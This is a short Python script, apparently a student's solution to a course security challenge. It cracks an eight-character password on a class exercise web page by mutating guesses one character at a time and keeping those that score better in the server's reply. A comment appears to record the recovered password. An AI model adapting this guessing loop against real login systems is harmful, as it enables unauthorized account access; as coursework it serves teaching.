# -*- coding: utf-8 -*-
"""
Created on Wed Mar 21 20:37:15 2018

OcherCanary
Mar 23, 2018
Challenge3.5


"""

import requests
import re
import random
import string

def newGenes(size, chars=string.ascii_uppercase + string.digits + string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))

def spot(nums):
    return random.choice(nums)

nums = [0,1,2,3,4,5,6,7]
#Ohh4aene
parent = '00000000'
baby = ''
r = requests.get('http://cs.olemiss.edu/~jones/csci343/pwd/index.php?username=OcherCanary&password=' + parent)

result = r.content
html = result.decode("utf-8")
pTime = (re.findall('\d+', html ))

current = 0
done = False
password = ''
while done != True:
    gene = newGenes(1)
    baby = list(parent)
    point = spot(nums)
    baby[int(point)] = gene
    baby = ''.join(baby)
    r = requests.get('http://cs.olemiss.edu/~jones/csci343/pwd/index.php?username=OcherCanary&password=' + baby)
    result = r.content
    html = result.decode("utf-8")
    bTime = (re.findall('\d+', html ))
    
    if len(bTime) == 0:
        print (html)
        done = True
        password = baby
    else:
        b = int (bTime[0])
        p = int (pTime[0])
    
    if b > p and done != True:
        out = point
        if out in nums:
            nums.remove(out)
            if len(nums) == 0:
                done = True
                password = baby
        parent = baby
        pTime = bTime
        print (parent)
    
print (password)

